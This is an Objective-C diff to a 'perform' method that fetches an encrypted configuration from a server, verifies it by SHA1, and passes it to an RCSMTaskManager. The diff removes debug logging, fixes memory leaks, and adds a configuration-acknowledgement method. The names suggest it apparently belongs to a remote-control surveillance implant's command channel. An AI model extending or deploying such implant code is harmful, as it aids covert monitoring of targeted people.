@@ -27,22 +27,16 @@
   if (self = [super init])
     {
       mTransport = aTransport;
-      
-#ifdef DEBUG_CONF_NOP
-      infoLog(@"mTransport: %@", mTransport);
-#endif
+
       return self;
     }
   
   return nil;
 }
 
+// Done.
 - (BOOL)perform
 {
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"");
-#endif
-  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   uint32_t command = PROTO_NEW_CONF;
@@ -50,11 +44,7 @@
                                                              length: sizeof(uint32_t)];
   NSData *commandSha = [commandData sha1Hash];
   [commandData appendData: commandSha];
-  
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"commandData: %@", commandData);
-#endif
-  
+
   [commandData encryptWithKey: gSessionKey];
   
   //
@@ -71,22 +61,14 @@
   
   if (replyData == nil)
     {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"empty reply from server");
-#endif
       [infoManager release];
       [commandData release];
       [outerPool release];
-
       return NO;
     }
   
   replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
   [replyDecrypted decryptWithKey: gSessionKey];
-  
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"replyDecrypted: %@", replyDecrypted);
-#endif
 
   [replyDecrypted getBytes: &command
                     length: sizeof(uint32_t)];
@@ -110,47 +92,32 @@
                   NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
     }
   @catch (NSException *e)
-    {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"exception on sha makerange (%@)", [e reason]);
-#endif
-      
+    { 
+      // FIXED-
+      [replyDecrypted release];
       [infoManager release];
+      [commandData release];
+      [outerPool release];
       return NO;
     }
   
   shaLocal = [shaLocal sha1Hash];
-  
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"shaRemote: %@", shaRemote);
-  infoLog(@"shaLocal : %@", shaLocal);
-#endif
-  
+
   if ([shaRemote isEqualToData: shaLocal] == NO)
-    {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"sha mismatch");
-#endif
-      
+    { 
       [infoManager release];
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
   if (command != PROTO_OK)
-    {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"No configuration available (command %d)", command);
-#endif
-      
+    {   
       [infoManager release];
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
     
@@ -162,37 +129,23 @@
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"exception on configSize makerange (%@)", [e reason]);
-#endif
-
       [infoManager logActionWithDescription: @"Corrupted configuration received"];
+      
       [infoManager release];
-
       [replyDecrypted release];
       [commandData release];
-      [outerPool release];
-      
+      [outerPool release];      
       return NO;
     }
-  
-#ifdef DEBUG_CONF_NOP
-  infoLog(@"configSize: %d", configSize);
-#endif
-  
-  if (configSize == 0)
-    {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"configuration size is zero!");
-#endif
-      
-      [infoManager logActionWithDescription: @"Corrupted configuration received"];
-      [infoManager release];
 
+  if (configSize == 0)
+    {   
+      [infoManager logActionWithDescription: @"Corrupted configuration received"];
+      
+      [infoManager release];
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
@@ -204,18 +157,13 @@
                     [replyDecrypted subdataWithRange: NSMakeRange(8, configSize)]];
     }
   @catch (NSException *e)
-    {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"exception on configData makerange (%@)", [e reason]);
-#endif
-      
+    {      
       [infoManager logActionWithDescription: @"Corrupted configuration received"];
+      
       [infoManager release];
-
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
   
@@ -224,23 +172,59 @@
   //
   RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
   
+  // Done.
   if ([taskManager updateConfiguration: configData] == FALSE)
-    {
-#ifdef DEBUG_CONF_NOP
-      errorLog(@"Error while storing new configuration");
-#endif
-    
+    {  
+      // FIXED-
       [configData release];
+      [infoManager release];
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
-      
       return NO;
     }
+  //
   
   [infoManager release];
   [configData release];
   [replyDecrypted release];
+  [commandData release];
+  [outerPool release];
+  
+  return YES;
+}
+
+- (BOOL)sendConfAck:(int)retAck
+{
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+  
+  uint32_t command = PROTO_NEW_CONF;
+  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
+                                                             length: sizeof(uint32_t)];
+  
+  [commandData appendBytes: &retAck length:sizeof(int)];                                                          
+  
+  NSData *commandSha = [commandData sha1Hash];
+  [commandData appendData: commandSha];
+
+  [commandData encryptWithKey: gSessionKey];
+  
+  //
+  // Send encrypted message
+  //
+  NSURLResponse *urlResponse    = nil;
+  NSData *replyData             = nil;
+  
+  replyData = [mTransport sendData: commandData
+                 returningResponse: urlResponse];
+  
+  if (replyData == nil)
+    {
+      [commandData release];
+      [outerPool release];
+      return NO;
+    }
+  
   [commandData release];
   [outerPool release];
   
